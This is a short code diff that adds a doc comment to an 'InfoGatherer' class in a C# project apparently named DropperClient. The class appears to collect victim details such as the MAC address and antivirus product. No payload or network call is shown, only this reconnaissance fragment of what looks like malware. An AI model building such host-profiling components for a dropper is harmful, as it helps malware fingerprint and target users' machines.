@@ -16,6 +16,9 @@ namespace DropperClient.SystemInfoGatherer
 
         public string AV { get; private set; }
 
+        /// <summary>
+        /// On creating the instance it fills all the properties with user information.
+        /// </summary>
         public InfoGatherer()
         {
             MacAddress = GetMacAddress();
